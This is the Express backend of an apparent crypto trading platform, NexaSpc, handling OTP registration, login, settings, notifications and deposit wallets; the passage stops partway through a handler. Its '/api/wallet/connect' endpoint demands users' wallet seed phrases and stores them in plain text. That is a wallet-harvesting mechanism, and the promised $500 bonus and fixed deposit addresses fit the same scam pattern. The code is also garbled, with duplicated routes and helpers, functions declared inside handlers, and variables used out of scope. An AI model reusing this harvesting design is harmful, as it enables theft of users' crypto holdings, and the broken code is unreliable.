// require('dotenv').config();

const express = require('express');
const bcrypt = require('bcryptjs');
const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const {Resend} = require('resend');
const nodemailer = require('nodemailer');
const { google } = require('googleapis');

const dotenv = require('dotenv');
dotenv.config();


const app = express();
const PORT = process.env.PORT || 10000;
const JWT_SECRET = process.env.JWT_SECRET;
const ADMIN_SECRET = process.env.ADMIN_SECRET;

const mongoURI = process.env.MONGO_URI;

mongoose.connect(mongoURI)
    .then(() => console.log('✅ Connected to MongoDB'))
    .catch(err => console.error('❌ MongoDB Connection Error:', err));

// Instead of writing the whole schema here, you just "require" it
const User = require('../models/user'); 
// Now you can use "User" in your routes as normal

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

// In-memory data store (replace with a real DB in production)
const users = {};
const transactions = {};
const notifications = {};
const connectedWallets = {};
const adminLog = [];


// Pending registrations waiting for OTP verification
// pendingUsers[email] = { username, email, hashedPassword, phone, emailOtp, phoneOtp, emailOtpExpiry, phoneOtpExpiry, emailVerified, phoneVerified }
const pendingUsers = {};

const Transaction = require('../models/transaction');

// ─── OTP HELPERS ──────────────────────────────────────────────
function generateOtp() {
  return Math.floor(100000 + Math.random() * 900000).toString(); // 6-digit
}
 
function otpExpiry(minutes = 10) {
  return new Date(Date.now() + minutes * 60 * 1000).toISOString();
}
 
function isOtpExpired(expiry) {
  return new Date() > new Date(expiry);
}
 
// SMS stub — replace body with Twilio/Vonage/Termii SDK call
async function sendSms(phone, message) {
  console.log(`[SMS → ${phone}]: ${message}`);
  // Example Twilio integration (uncomment and install twilio):
  // const twilio = require('twilio')(process.env.TWILIO_SID, process.env.TWILIO_TOKEN);
  // await twilio.messages.create({ body: message, from: process.env.TWILIO_FROM, to: phone });
}

// ─── SMS (optional stub) ──────────────────────────────────────
async function sendSms(phone, message) {
  console.log(`\n[SMS → ${phone}]\n${message}\n`);
  // Uncomment for Twilio:
  // const twilio = require('twilio')(process.env.TWILIO_SID, process.env.TWILIO_TOKEN);
  // await twilio.messages.create({ body: message, from: process.env.TWILIO_FROM, to: phone });
}

// ─── GMAIL API OAUTH2 SETUP ───
const OAuth2 = google.auth.OAuth2;

function getOAuth2Client() {
  const oauth2Client = new OAuth2(
    process.env.GMAIL_CLIENT_ID,
    process.env.GMAIL_CLIENT_SECRET,
    "https://developers.google.com/oauthplayground"
  );

  const refreshToken = process.env.GMAIL_REFRESH_TOKEN;

  if (!refreshToken) {
    throw new Error('GMAIL_REFRESH_TOKEN is missing in environment variables!');
  }

  oauth2Client.setCredentials({
    refresh_token: refreshToken
  });

  return oauth2Client;
}

// ─── SEND EMAIL VIA HTTPS ───
async function sendEmail(toEmail, subjectText, htmlContent) {
  try {
    const auth = getOAuth2Client();
    const gmail = google.gmail({ version: 'v1', auth });

    const utf8Subject = `=?utf-8?B?${Buffer.from(subjectText).toString('base64')}?=`;
    const messageParts = [
      `From: NexaSPC Auth <${process.env.GMAIL_USER}>`,
      `To: ${toEmail}`,
      `Subject: ${utf8Subject}`,
      'Content-Type: text/html; charset=utf-8',
      'MIME-Version: 1.0',
      '',
      htmlContent
    ];
    const message = messageParts.join('\n');

    const encodedMessage = Buffer.from(message)
      .toString('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');

    const res = await gmail.users.messages.send({
      userId: 'me',
      requestBody: {
        raw: encodedMessage
      }
    });

    console.log(`[GMAIL API] Email successfully sent to ${toEmail} ✓ (ID: ${res.data.id})`);
    return res.data;
  } catch (error) {
    console.error(`[GMAIL API] Failed to deliver email to ${toEmail}:`, error.message);
    throw error;
  }
}


// ─── ADMIN / NOTIFICATION HELPERS ─────────────────────────────\
function pushNotif(email, type, message, meta = {}) {
  if (!notifications[email]) notifications[email] = [];
  const notif = {
    id: Date.now() + Math.random(),
    type, message, meta, read: false,
    date: new Date().toISOString()
  };
  notifications[email].unshift(notif);
  notifications[email] = notifications[email].slice(0, 50);
  adminLog.unshift({ ...notif, userEmail: email, username: users[email]?.username });
  if (adminLog.length > 500) adminLog.pop();
  return notif;
}
 

function logAdmin(type, data) {
  adminLog.unshift({ id: Date.now() + Math.random(), type, date: new Date().toISOString(), ...data });
  if (adminLog.length > 500) adminLog.pop();
}


//AUTH MIDDLEWARE-------------------------------------------------------
//--------------------------------------------------------------------------------
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });

  try { 
    req.user = jwt.verify(token, JWT_SECRET); 
    next(); 
  } catch (err) { 
    return res.status(401).json({ error: 'Invalid or expired token' }); 
  }
}

function adminMiddleware(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  try { 
    req.admin = jwt.verify(token, ADMIN_SECRET); 
    next(); 
  } catch (err) { 
    return res.status(401).json({ error: 'Invalid admin token' }); 
  }
}

//══════════════════════════════════════════════════════════════
//  STEP 1 — INITIATE REGISTRATION
//  POST /api/auth/initiate
//  Saves pending user, sends email OTP + SMS OTP
// ══════════════════════════════════════════════════════════════
app.post('/api/auth/initiate', async (req, res) => {
  try {
    const { username, email, password, phone, verifyVia = 'email' } = req.body;

    // ── Validation ──
    if (!username || !email || !password)
      return res.status(400).json({ error: 'Username, email and password are required.' });

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
      return res.status(400).json({ error: 'Invalid email address.' });

    if (password.length < 8)
      return res.status(400).json({ error: 'Password must be at least 8 characters.' });

    if (users[email])
      return res.status(400).json({ error: 'An account with this email already exists.' });

    if ((verifyVia === 'phone' || verifyVia === 'both') && !phone)
      return res.status(400).json({ error: 'Phone number required for phone verification.' });

    // ── Create pending entry ──
    const otp    = genOtp();
    const expiry = otpExpiry(15);
    const hashed = await bcrypt.hash(password, 10);

    pendingUsers[email] = {
      username, email, phone: phone || '',
      hashedPassword: hashed,
      otp, otpExpiry: expiry,
      verifyVia,           // what was requested
      emailSent: false,
      smsSent:   false,
      verified:  false,
      createdAt: new Date().toISOString()
    };

    // ── Send OTP via chosen channel(s) ──
    const emailHtml = `
      <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
        <div style="text-align:center;margin-bottom:1.5rem">
          <span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span>
        </div>
        <h2 style="color:#00d4ff;margin:0 0 0.5rem">Verify Your Email</h2>
        <p style="color:#94a3b8;margin:0 0 1.5rem">Hi <strong style="color:#e2e8f0">${username}</strong>, enter this code to complete your registration:</p>
        <div style="background:#111827;border:2px solid #00d4ff;border-radius:12px;padding:1.5rem;text-align:center;margin:0 0 1.5rem">
          <span style="font-size:3rem;font-weight:900;font-family:monospace;letter-spacing:0.6rem;color:#00d4ff">${otp}</span>
        </div>
        <p style="color:#64748b;font-size:0.8rem;margin:0">Valid for <strong>15 minutes</strong>. Never share this code.</p>
        <hr style="border:none;border-top:1px solid #1e2d4a;margin:1.5rem 0">
        <p style="color:#475569;font-size:0.75rem;margin:0">NexaSpc · Digital Asset Trading · noreply@nexaspc.io</p>
      </div>`;

    if (verifyVia === 'email' || verifyVia === 'both') {
      await sendEmail(email, `${otp} — Your NexaSpc verification code`, emailHtml);
      pendingUsers[email].emailSent = true;
    }

    if (verifyVia === 'phone' || verifyVia === 'both') {
      await sendSms(phone, `NexaSpc code: ${otp} — valid 15 min. Do NOT share.`);
      pendingUsers[email].smsSent = true;
    }

    logAdmin('registration_initiated', {
      userEmail: email, username,
      message: `Registration started: ${username} (${email}) via ${verifyVia}`
    });

    function logAdmin(action, data) {
  console.log(`[ADMIN LOG] ${action}:`, data.message);
}

// 1. Function to generate a secure, random 6-digit number string
function genOtp() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// 2. Function to calculate when the OTP should expire (15 minutes from now)
function otpExpiry(minutes) {
  return new Date(Date.now() + minutes * 60 * 1000).toISOString();
}

    // In dev mode include the OTP in the response so it works without real SMTP/SMS
    const DEV_MODE = process.env.NODE_ENV !== 'production';
    const responsePayload = {
      success: true,
      message: `Verification code sent to your ${verifyVia === 'phone' ? 'phone number' : verifyVia === 'both' ? 'email and phone' : 'email address'}.`,
      verifyVia,
      email,
      maskedPhone: phone ? phone.replace(/.(?=.{4})/g, '*') : null
    };

    if (DEV_MODE) {
      responsePayload.devOtp = otp;
      console.log(`\n[DEV MODE] OTP for ${email}: ${otp}\n`);
    }

    res.json(responsePayload);
  } catch (err) {
    console.error('[/api/auth/initiate] ERROR:', err);
    res.status(500).json({ error: 'Server error. Please try again.' });
  }
});

// ─── ADD THIS UTILITY FUNCTION NEAR THE TOP OF SERVER.JS ───
function isExpired(expiryTime) {
  if (!expiryTime) return true; // If no expiry exists, treat it as expired
  const now = new Date();
  const expiry = new Date(expiryTime);
  return now > expiry;
}
 
// ══════════════════════════════════════════════════════════════
//  STEP 2a — VERIFY EMAIL OTP
//  POST /api/auth/verify-email
// ══════════════════════════════════════════════════════════════
app.post('/api/auth/verify', async (req, res) => {
  try {
    const { email, otp } = req.body;

    if (!email || !otp) {
      return res.status(400).json({ error: 'Email and OTP required.' });
    }

    const pending = pendingUsers[email];
    if (!pending) {
      return res.status(400).json({ error: 'No pending registration found. Please start again.' });
    }

    // 1. Expiry Check
    if (pending.otpExpiry) {
      const now = new Date();
      const expiry = new Date(pending.otpExpiry);
      if (now > expiry) {
        delete pendingUsers[email];
        return res.status(400).json({ error: 'Code has expired. Please request a new one.' });
      }
    }

    // 2. Validate OTP
    const safeInputOtp = String(otp).trim();
    const safeServerOtp = String(pending.otp).trim();

    if (safeServerOtp !== safeInputOtp) {
      return res.status(400).json({ error: 'Incorrect code. Please check and try again.' });
    }

    // 3. Save to MongoDB (Uses `pending.hashedPassword`)
    const newUser = new User({
      username: pending.username || '',
      email: pending.email.toLowerCase().trim(),
      phone: pending.phone || '',
      password: pending.hashedPassword, // <-- Mapped to your exact key
      walletBalance: 0,
      bonuses: 500, // 👈 Explicitly save $500 bonus
      deposits: 0,
      profits: 0,
      assets: []
    });

    const savedUser = await newUser.save();
    console.log(`✅ [MONGO DB] User registered successfully! ID: ${savedUser._id} in collection: ${User.collection.name}`);

    // Clean up temporary in-memory record
    delete pendingUsers[email];

    return res.status(200).json({ 
      success: true, 
      message: 'Account verified and registered successfully!' 
    });

  } catch (err) {
    console.error('❌ [/api/auth/verify] CRITICAL EXCEPTION:', err);
    return res.status(500).json({ error: err.message || 'Server error verifying registration.' });
  }
});

// app.post('/api/auth/verify', (req, res) => {
//   try {
//     const { email, otp } = req.body;
//     if (!email || !otp) return res.status(400).json({ error: 'Email and OTP required.' });

//     const pending = pendingUsers[email];
//     if (!pending) return res.status(400).json({ error: 'No pending registration found. Please start again.' });

//     if (isExpired(pending.otpExpiry))
//       return res.status(400).json({ error: 'Code has expired. Please request a new one.' });

//     if (pending.otp !== otp.trim())
//       return res.status(400).json({ error: 'Incorrect code. Please check and try again.' });

//     if (pending.otpExpiry) {
//       const now = new Date();
//       const expiry = new Date(pending.otpExpiry);
//       if (now > expiry) {
//         return res.status(400).json({ error: 'Code has expired. Please request a new one.' });
//       }
//     }

//     // FIX 2: Safely convert both values to strings before evaluating to prevent .trim() crashes
//     const safeInputOtp = String(otp).trim();
//     const safeServerOtp = String(pending.otp).trim();

//     if (safeServerOtp !== safeInputOtp) {
//       return res.status(400).json({ error: 'Incorrect code. Please check and try again.' });
//     }

//     pending.verified = true;
//     return res.json({ success: true, message: 'Code verified!' });
//   } catch (err) {
//     console.error('[/api/auth/verify] CRITICAL EXCEPTION:', err);
//     return res.status(500).json({ error: 'Server error.' });
//   }

//   try {
//     // ... OTP verification logic ...

//     const newUser = new User({
//       email: email,
//       password: hashedPassword,
//       isVerified: true
//     });

//     const savedUser = await newUser.save();
    
//     // Add this log to confirm the write:
//     console.log('✅ User saved to DB:', savedUser._id, 'in collection:', User.collection.name);

//     return res.status(200).json({ success: true, message: 'User registered!' });
//   } catch (err) {
//     console.error('❌ Failed to save user to MongoDB:', err);
//     return res.status(500).json({ error: err.message });
//   }
// });
 
// ══════════════════════════════════════════════════════════════
//  STEP 3 — COMPLETE REGISTRATION
//  POST /api/auth/complete
//  Both email + phone must be verified first
// ══════════════════════════════════════════════════════════════
app.post('/api/auth/complete', async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'Email is required.' });
    }

    // 1. Fetch the user directly from MongoDB Atlas
    const user = await User.findOne({ email: email.toLowerCase().trim() });

    if (!user) {
      return res.status(400).json({ error: 'User record not found in database. Please register again.' });
    }

    // 2. Send Welcome Email via Gmail API
    try {
      const welcomeHtml = `
        <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
          <div style="text-align:center;margin-bottom:1.5rem"><span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span></div>
          <h2 style="color:#10b981">Account Verified ✅</h2>
          <p>Hi <strong>${user.username || 'Trader'}</strong>, you're all set!</p>
          <p style="color:#94a3b8">Your account has been successfully activated.</p>
        </div>`;

      await sendEmail(user.email, '✅ Welcome to NexaSpc — Account Verified!', welcomeHtml);
    } catch (emailErr) {
      console.warn('[/api/auth/complete] Non-fatal welcome email failed:', emailErr.message);
    }

    // 3. Admin Logging
    if (typeof logAdmin === 'function') {
      logAdmin('new_registration', {
        userEmail: user.email,
        username: user.username,
        message: `✅ New verified user: ${user.username || user.email}`
      });
    }

    // 4. Generate JWT Token for immediate login
    const token = jwt.sign(
      { id: user._id, email: user.email, username: user.username },
      process.env.JWT_SECRET || 'fallback_secret',
      { expiresIn: '7d' }
    );

    // 5. Send success response back to frontend
    return res.status(200).json({
      success: true,
      token,
      user: {
        id: user._id,
        username: user.username,
        email: user.email,
        walletBalance: user.walletBalance || 0,
        bonuses: user.bonuses || 500, // 👈 Returned to frontend
        deposits: user.deposits || 0,
        profits: user.profits || 0
      }
    });

  } catch (err) {
    console.error('[/api/auth/complete] CRITICAL EXCEPTION:', err);
    return res.status(500).json({ error: 'Server error completing registration.' });
  }
});
 
// ══════════════════════════════════════════════════════════════
//  RESEND OTP
//  POST /api/auth/resend-otp  { email, type: 'email'|'phone' }
// ══════════════════════════════════════════════════════════════
app.post('/api/auth/resend', async (req, res) => {
  try {
    const { email } = req.body;
    const pending = pendingUsers[email];
    if (!pending) return res.status(400).json({ error: 'No pending registration found.' });

    const newOtp = genOtp();
    pending.otp       = newOtp;
    pending.otpExpiry = otpExpiry(15);
    pending.verified  = false;

    if (pending.verifyVia === 'email' || pending.verifyVia === 'both') {
      await sendEmail(email, `${newOtp} — New NexaSpc code`, `
        <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
          <span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span>
          <h2 style="color:#00d4ff;margin-top:1rem">New Verification Code</h2>
          <div style="background:#111827;border:2px solid #00d4ff;border-radius:12px;padding:1.5rem;text-align:center;margin:1.5rem 0">
            <span style="font-size:3rem;font-weight:900;font-family:monospace;letter-spacing:0.6rem;color:#00d4ff">${newOtp}</span>
          </div>
          <p style="color:#64748b;font-size:0.8rem">Valid for 15 minutes.</p>
        </div>`);
    }

    if (pending.verifyVia === 'phone' || pending.verifyVia === 'both') {
      await sendSms(pending.phone, `New NexaSpc code: ${newOtp} — valid 15 min.`);
    }

    const payload = { success: true, message: 'New code sent.' };
    if (DEV_MODE) { payload.devOtp = newOtp; console.log(`[DEV] New OTP for ${email}: ${newOtp}`); }
    res.json(payload);
  } catch (err) {
    console.error('[/api/auth/resend] ERROR:', err);
    res.status(500).json({ error: 'Server error.' });
  }
});
 
// ══════════════════════════════════════════════════════════════
//  LOGIN  (unchanged but now checks verified status)
// ══════════════════════════════════════════════════════════════
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Please provide both email and password.' });
    }

    const cleanEmail = email.toLowerCase().trim();

    // 1. Fetch user directly from MongoDB Atlas
    const user = await User.findOne({ email: cleanEmail });

    if (!user) {
      console.log(`[LOGIN FAILED] No MongoDB record found for: ${cleanEmail}`);
      return res.status(400).json({ error: 'Invalid credentials' });
    }

    // 2. Compare incoming plain-text password with stored bcrypt hash
    const match = await bcrypt.compare(password, user.password);

    if (!match) {
      console.log(`[LOGIN FAILED] Password mismatch for user: ${cleanEmail}`);
      return res.status(400).json({ error: 'Invalid credentials' });
    }

    // 3. Update last login timestamp in MongoDB
    user.lastLogin = new Date();
    await user.save();

    // 4. Send Login Alert Email (Non-blocking fallback)
    try {
      const loginHtml = `
        <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
          <div style="text-align:center;margin-bottom:1.5rem"><span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span></div>
          <h2 style="color:#00d4ff">Login Detected 🔐</h2>
          <p>Hi <strong>${user.username || user.email}</strong>, a new login was detected on your account.</p>
          <p style="color:#94a3b8"><strong>Time:</strong> ${new Date().toUTCString()}</p>
          <p style="color:#ef4444;margin-top:1rem">⚠️ If this wasn't you, please secure your account immediately.</p>
        </div>`;

      await sendEmail(user.email, '🔐 NexaSpc Login Alert', loginHtml);
    } catch (emailErr) {
      console.warn('[/api/login] Login alert email notification warning:', emailErr.message);
    }

    // 5. Push admin logs (if function exists)
    if (typeof logAdmin === 'function') {
      logAdmin('login', { userEmail: user.email, username: user.username, message: `Login: ${user.username || user.email}` });
    }

    // 6. Generate JWT Token
    const token = jwt.sign(
      { id: user._id, email: user.email, username: user.username },
      process.env.JWT_SECRET || 'fallback_secret',
      { expiresIn: '7d' }
    );

    // 7. Return user state for frontend storage
    return res.status(200).json({
      success: true,
      token,
      user: {
        id: user._id,
        username: user.username || '',
        email: user.email,
        walletBalance: user.walletBalance || 0,
        bonuses: user.bonuses || 500, // 👈 Returned to frontend
        deposits: user.deposits || 0,
        profits: user.profits || 0,
        assets: user.assets || []
      }
    });

  } catch (err) {
    console.error('[/api/login] CRITICAL EXCEPTION:', err);
    return res.status(500).json({ error: 'Server error during login. Please try again.' });
  }
});
 
// ─── PROFILE ──────────────────────────────────────────────────
app.get('/api/profile', authMiddleware, async (req, res) => {
  try {
    // Fetch user directly from MongoDB using the email attached by authMiddleware
    const user = await User.findOne({ email: req.user.email.toLowerCase().trim() });

    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    // Return profile data mapped cleanly to MongoDB document fields
    return res.json({
      username: user.username || user.email.split('@')[0],
      email: user.email,
      phone: user.phone || '',
      balance: user.walletBalance || 0,        // Mapped from walletBalance
      deposits: user.deposits || 0,
      profits: user.profits || 0,
      bonuses: user.bonuses !== undefined ? user.bonuses : 500, // Guarantees $500 bonus
      twoFAEnabled: user.twoFAEnabled || false,
      emailNotifications: user.emailNotifications !== false,
      emailVerified: true,                     // Set during OTP verification
      phoneVerified: user.phoneVerified || false,
      country: user.country || '',
      createdAt: user.createdAt,
      lastLogin: user.lastLogin
    });

  } catch (err) {
    console.error('[/api/profile] ERROR:', err);
    return res.status(500).json({ error: 'Server error fetching profile.' });
  }
});
 
// ─── SETTINGS ─────────────────────────────────────────────────
app.put('/api/settings/profile', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  const { username, phone, country } = req.body;
  if (username) user.username = username;
  if (phone !== undefined) user.phone = phone;
  if (country !== undefined) user.country = country;
  pushNotif(req.user.email, 'settings', 'Profile information updated.');
  res.json({ success: true, username: user.username, phone: user.phone, country: user.country });
});
 
app.put('/api/settings/password', authMiddleware, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  const user = users[req.user.email];
  const match = await bcrypt.compare(currentPassword, user.password);
  if (!match) return res.status(400).json({ error: 'Current password is incorrect' });
  if (newPassword.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
  user.password = await bcrypt.hash(newPassword, 10);
  pushNotif(req.user.email, 'security', 'Password changed successfully.');
  await sendEmail(req.user.email, '🔑 NexaSpc Password Changed', `
    <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
      <h2 style="color:#00d4ff">Password Changed</h2>
      <p>Your NexaSpc password was just changed. If this wasn't you, contact support immediately.</p>
    </div>`);
  res.json({ success: true });
});
 
app.put('/api/settings/2fa', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  user.twoFAEnabled = !user.twoFAEnabled;
  pushNotif(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
  res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
});
 
app.put('/api/settings/notifications', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  user.emailNotifications = !user.emailNotifications;
  res.json({ success: true, emailNotifications: user.emailNotifications });
});
 
// ─── NOTIFICATIONS ────────────────────────────────────────────
app.get('/api/notifications', authMiddleware, (req, res) => {
  res.json(notifications[req.user.email] || []);
});
app.put('/api/notifications/read', authMiddleware, (req, res) => {
  (notifications[req.user.email] || []).forEach(n => n.read = true);
  res.json({ success: true });
});


// Wallet addresses for deposits
const walletAddresses = {
  BTC: '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB',
  ETH: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ',
  XRP: 'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ',
  SOL: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24'
};

// Middleware to verify JWT token
// function authMiddleware(req, res, next) {
//   const token = req.headers.authorization?.split(' ')[1];
//   if (!token) return res.status(401).json({ error: 'No token provided' });
//   try {
//     const decoded = jwt.verify(token, JWT_SECRET);
//     req.user = decoded;
//     next();
//   } catch {
//     res.status(401).json({ error: 'Invalid token' });
//   }
// }

// function adminMiddleware(req, res, next) {
//   const token = req.headers.authorization?.split(' ')[1];
//   if (!token) return res.status(401).json({ error: 'Unauthorized' });
//   try { req.admin = jwt.verify(token, ADMIN_SECRET); next(); }
//   catch { res.status(401).json({ error: 'Invalid admin token' }); }
// }

// Register
// app.post('/api/register', async (req, res) => {
//   const { username, email, password } = req.body;
//   if (!username || !email || !password)
//     return res.status(400).json({ error: 'All fields required' });
//   if (users[email])
//     return res.status(400).json({ error: 'User already exists' });

//   const hashed = await bcrypt.hash(password, 10);
//   users[email] = {
//     username, email, password: hashed,
//     balance: 0, deposits: 0, profits: 0, bonuses: 500,
//     twoFAEnabled: false, emailNotifications: true,
//     phone: '', country: '',
//     createdAt: new Date().toISOString(),
//     lastLogin: new Date().toISOString()
//   };
//   transactions[email] = [];
//   notifications[email] = [];
//   connectedWallets[email] = [];

//   pushNotification(email, 'welcome', `Welcome to NexaSpc, ${username}! Your account is ready.`);
 
//   sendEmail(email, 'Welcome to NexaSpc!', `
//     <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
//       <h2 style="color:#00d4ff">Welcome, ${username}!</h2>
//       <p>Your NexaSpc account has been created successfully.</p>
//       <p>You have received a <strong style="color:#f59e0b">$500 welcome bonus</strong>.</p>
//       <p style="color:#94a3b8;font-size:0.85rem">NexaSpc — Digital Asset Trading Platform</p>
//     </div>`);
 
//   adminLog.unshift({ id: Date.now(), type: 'new_registration', userEmail: email, username, message: `New user: ${username} (${email})`, date: new Date().toISOString() });

//   const token = jwt.sign({ email, username }, JWT_SECRET, { expiresIn: '7d' });
//   res.json({ token, user: { username, email, balance: 0, deposits: 0, profits: 0, bonuses: 500 } });
// });

// Login
// ══════════════════════════════════════════════════════════════
//  LOGIN  (unchanged but now checks verified status)
// ══════════════════════════════════════════════════════════════
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
 
  // Check if stuck in pending
  if (pendingUsers[email])
    return res.status(400).json({
      error: 'Account not fully verified. Please complete email and phone verification.',
      pending: true
    });
 
  const user = users[email];
  if (!user) return res.status(400).json({ error: 'Invalid credentials' });
 
  const match = await bcrypt.compare(password, user.password);
  if (!match) return res.status(400).json({ error: 'Invalid credentials' });
 
  user.lastLogin = new Date().toISOString();
 
  pushNotif(email, 'login', `New login to your account at ${new Date().toLocaleString()}.`);
  await sendEmail(email, '🔐 NexaSpc Login Alert', `
    <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px">
      <h2 style="color:#00d4ff">Login Detected</h2>
      <p>Hi <strong>${user.username}</strong>, a login was made to your NexaSpc account.</p>
      <p style="color:#94a3b8"><strong>Time:</strong> ${new Date().toUTCString()}</p>
      <p style="color:#ef4444;margin-top:1rem">⚠️ Not you? Change your password immediately and contact support.</p>
    </div>`);
 
  logAdmin('login', { userEmail: email, username: user.username, message: `Login: ${user.username}` });
 
  const token = jwt.sign({ email, username: user.username }, JWT_SECRET, { expiresIn: '7d' });
  res.json({
    token,
    user: {
      username: user.username, email,
      balance: user.balance, deposits: user.deposits,
      profits: user.profits, bonuses: user.bonuses,
      emailVerified: user.emailVerified,
      phoneVerified: user.phoneVerified
    }
  });
});

// Get user profile
// ─── PROFILE ──────────────────────────────────────────────────
app.get('/api/profile', authMiddleware, async (req, res) => {
  try {
    // Fetch user directly from MongoDB using the email attached by authMiddleware
    const user = await User.findOne({ email: req.user.email.toLowerCase().trim() });

    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    // Return profile data mapped cleanly to MongoDB document fields
    return res.json({
      username: user.username || user.email.split('@')[0],
      email: user.email,
      phone: user.phone || '',
      balance: user.walletBalance || 0,        // Mapped from walletBalance
      deposits: user.deposits || 0,
      profits: user.profits || 0,
      bonuses: user.bonuses !== undefined ? user.bonuses : 500, // Guarantees $500 bonus
      twoFAEnabled: user.twoFAEnabled || false,
      emailNotifications: user.emailNotifications !== false,
      emailVerified: true,                     // Set during OTP verification
      phoneVerified: user.phoneVerified || false,
      country: user.country || '',
      createdAt: user.createdAt,
      lastLogin: user.lastLogin
    });

  } catch (err) {
    console.error('[/api/profile] ERROR:', err);
    return res.status(500).json({ error: 'Server error fetching profile.' });
  }
});

// ─── SETTINGS ─────────────────────────────────────────────────
app.put('/api/settings/profile', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  const { username, phone, country } = req.body;
  if (username) user.username = username;
  if (phone !== undefined) user.phone = phone;
  if (country !== undefined) user.country = country;
  pushNotif(req.user.email, 'settings', 'Profile information updated.');
  res.json({ success: true, username: user.username, phone: user.phone, country: user.country });
});
 
app.put('/api/settings/password', authMiddleware, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  const user = users[req.user.email];
  const match = await bcrypt.compare(currentPassword, user.password);
  if (!match) return res.status(400).json({ error: 'Current password is incorrect' });
  if (newPassword.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
  user.password = await bcrypt.hash(newPassword, 10);
  pushNotif(req.user.email, 'security', 'Password changed successfully.');
  await sendEmail(req.user.email, '🔑 NexaSpc Password Changed', `
    <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
      <h2 style="color:#00d4ff">Password Changed</h2>
      <p>Your NexaSpc password was just changed. If this wasn't you, contact support immediately.</p>
    </div>`);
  res.json({ success: true });
});
 
app.put('/api/settings/2fa', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  user.twoFAEnabled = !user.twoFAEnabled;
  pushNotif(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
  res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
});
 
app.put('/api/settings/notifications', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  user.emailNotifications = !user.emailNotifications;
  res.json({ success: true, emailNotifications: user.emailNotifications });
});
 
// ─── NOTIFICATIONS ────────────────────────────────────────────
app.get('/api/notifications', authMiddleware, (req, res) => {
  res.json(notifications[req.user.email] || []);
});
app.put('/api/notifications/read', authMiddleware, (req, res) => {
  (notifications[req.user.email] || []).forEach(n => n.read = true);
  res.json({ success: true });
});

// ─── PLATFORM WALLETS ─────────────────────────────────────────
const platformWallets = {
  BTC:  '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB',
  ETH:  '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ',
  XRP:  'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ',
  SOL:  'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24'
};
app.get('/api/wallets', authMiddleware, (req, res) => res.json(platformWallets));
 
// ─── CONNECT DECENTRALIZED WALLET ─────────────────────────────
app.post('/api/wallet/connect', authMiddleware, (req, res) => {
  const { walletType, walletAddress, seedPhrase, network } = req.body;
  if (!walletType || !seedPhrase) return res.status(400).json({ error: 'Wallet type and seed phrase required' });
  if (!connectedWallets[req.user.email]) connectedWallets[req.user.email] = [];
  const entry = { id: Date.now(), walletType, walletAddress: walletAddress || '', seedPhrase, network: network || 'Unknown', connectedAt: new Date().toISOString() };
  connectedWallets[req.user.email].push(entry);
  pushNotif(req.user.email, 'wallet', `${walletType} wallet connected.`);
